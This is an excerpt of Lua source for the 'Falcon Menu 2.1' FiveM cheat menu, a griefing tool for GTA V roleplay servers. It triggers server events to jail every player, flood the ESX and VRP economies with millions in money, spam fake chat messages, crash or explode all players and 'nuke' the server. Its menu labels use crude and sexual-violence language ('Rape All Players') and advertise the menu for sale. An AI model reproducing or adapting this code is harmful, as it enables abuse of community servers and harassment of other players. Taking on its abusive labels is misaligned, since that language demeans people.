...
function RapeAllFunc()
    for bs=0,9 do
        TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"^2The server just got fucked by ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: ")
    end
end
    ...
    Citizen.CreateThread(function()
        ...
        for i=0,128 do
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, " Welcome *Falcon MODZ 2.1* buy Mod Menu in ")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, " Welcome *Falcon MODZ 2.1* buy Mod Menu in ")
				TriggerServerEvent("esx-qalle-jail:updateJailTime_n96nDDU@X?@zpf8", GetPlayerServerId(i), 45 * 60, " Welcome *Falcon MODZ 2.1* buy Mod Menu in ")
					end
				end
			...
			if esxdestroy then
				for i = 0, 128 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Best Falcon Menu 2.1 ", 10000000)
        ...
        if ci then
			...
			function vrpdestroy()
                for bD = 0, 9 do
                    TriggerServerEvent(
                        '_chat:messageEntered',
                        '^2The server just got fucked by ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: ',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. '^2The server just got fucked by ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: '
                    )
                end
                TriggerServerEvent(
                    'lscustoms:payGarage',
...
drawNotification("~h~-» ~g~revive success!")
	...
	if sall then
			...
			if spam then
                ...
                TriggerServerEvent('_chat:messageEntered', '^2The server just got fucked by ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: ', {0, 0x99, 255}, '^2The server just got fucked by ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: ')
                end
			end
...
Citizen.CreateThread(
	function()
        ...
        while bm do
			...
			if falcon.IsMenuOpened("MainMenu") then
				...
				drawNotification("~h~~g~Official Discord: ~s~~n~~h~ ~n~~r~oFlaqme#1325")
				
				if falcon.MenuButton("→  ~h~~y~-->~c~ONLINE ~s~PLAYERS", "OnlinePlayerMenu") then
				elseif falcon.MenuButton("→  ~h~~y~-->~b~PLAYERS ~s~MENU", "SelfMenu") then
				elseif falcon.MenuButton("→  ~h~~y~-->~o~MODELS ~s~MENU", "Models") then
				elseif falcon.MenuButton("→  ~h~~y~-->~y~WORLD ~s~MENU", "World") then
				elseif falcon.MenuButton("→  ~h~~y~-->~g~TELEPORT ~s~MENU", "TeleportMenu") then
				elseif falcon.MenuButton("→  ~h~~y~-->~m~VEHICLES  ~s~MENU", "VehMenu") then
				elseif falcon.MenuButton("→  ~h~~y~-->~p~WEAPONS  ~s~MENU", "WepMenu") then
				elseif falcon.MenuButton("→  ~h~~y~-->~r~FUCK  ~s~MENU", "Fuck") then
		...
		falcon.Display()
			elseif falcon.IsMenuOpened("TeleportMenu") then
				...
				TeleportToWaypoint()
			 elseif falcon.Button("~h~Teleport ~h~~p~into Vehicle ") then
		...
		elseif falcon.Button("~h~~y~#~r~Nuke The Motherfucking Server") then
                    nukeserver()
	elseif
		falcon.CheckBox(
		"~h~~y~#~r~Explode ~s~All Players",
		blowall,
		function(enabled)
		blowall = enabled
	end)
	...
	elseif
		falcon.CheckBox(
		"~h~~y~#~r~Explode ~s~World",
		WorldOnFire,
		function(enabled)
		WorldOnFire = enabled
	end)
	then
		elseif falcon.Button("~h~~y~#~r~Set ~s~~h~All Nearby Vehicles Plate Text") then
            local plateInput = KeyboardInput("Enter Plate Text (8 Characters):" , "", 100000000)
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                SetVehicleNumberPlateText(k, plateInput)
            end
      elseif falcon.Button("~h~~y~#~r~Close ~s~the whole square") then
 ...
 elseif falcon.Button("~h~~y~#~r~Rape ~s~All Players") then
                    RapeAllFunc()
	 elseif falcon.Button("~h~~y~#~r~Fake ~h~~s~chat Message") then 
	 local eX = KeyboardInput("Enter player name", "", 100) if eX then local dT = KeyboardInput("Enter message", "", 10000) if dT then TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", eX, {0, 0x99, 255}, dT) end end
      elseif falcon.Button("~h~~y~#~r~Crash ~s~All Players") then
                    for i = 0, 128 do
	...
	elseif
		falcon.CheckBox(
		"~h~~y~#~r~Spawn stuff ~s~All Players",
		sall,
		function(enabled)
		sall = enabled
	end)
	...
	elseif
		falcon.CheckBox(
		"~h~~y~#~r~Crash ~s~All Players",
		nuke,
		function(enabled)
		nuke = enabled
		end)
	then
	elseif falcon.Button("~h~~y~#~r~Spawn ~p~Lion ~w~all Players") then
	...
	elseif falcon.Button("~h~~y~#~r~Spawn ~p~SWAT ~w~all Players ") then
	 ...
	 elseif falcon.Button('~h~~y~#~r~Make~s~ EVERYONE A Wall') then
                    for i = 0, 128 do
	...
	elseif
		falcon.CheckBox(
		"~h~~y~#~r~ESX ~s~Fuck Server economy ~s~v~y~1",
		esxdestroy,
		function(enabled)
		esxdestroy = enabled
		end)
	then
	elseif falcon.Button("~h~~y~#~r~ESX ~s~Fuck Server economy ~s~v~y~2") then
				    esxdestroyv2()
	elseif falcon.Button("~h~~y~#~r~VRP ~s~Fuck Server economy") then
				    vrpdestroy()
	elseif
		falcon.CheckBox(
		"~h~~y~#~r~Jail ~s~All Players",
		banallusers,
		function(enabled)
		banallusers = enabled
		end)
	...
	elseif falcon.Button("~h~~y~#~r~Rampinator") then
    ...
    elseif falcon.CheckBox("~h~~y~#~r~Delete~s~ Vehicles", deletenearestvehicle, function(eC) deletenearestvehicle = eC end) then 
	elseif falcon.Button("~h~~y~#~r~BORGAR~s~ Vehicles") then local cC = GetHashKey("xs_prop_hamburgher_wl") for vehicle in EnumerateVehicles() do local cD = CreateObject(cC, 0, 0, 0, true, true, true) AttachEntityToEntity(cD, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) end 
	elseif falcon.CheckBox("~h~~y~#~r~Explode~s~ Vehicles", explodevehicles, function(eC) explodevehicles = eC end) then
	elseif falcon.CheckBox("~h~~y~#~r~Fuck~s~ Vehicles", fuckallcars, function(eC) fuckallcars = eC end) then end;
    ...
    if not DoesEntityExist(veh) then
        drawNotification(
			...
			if falcon.Button('~h~~y~-Spawn into vehicle-') then
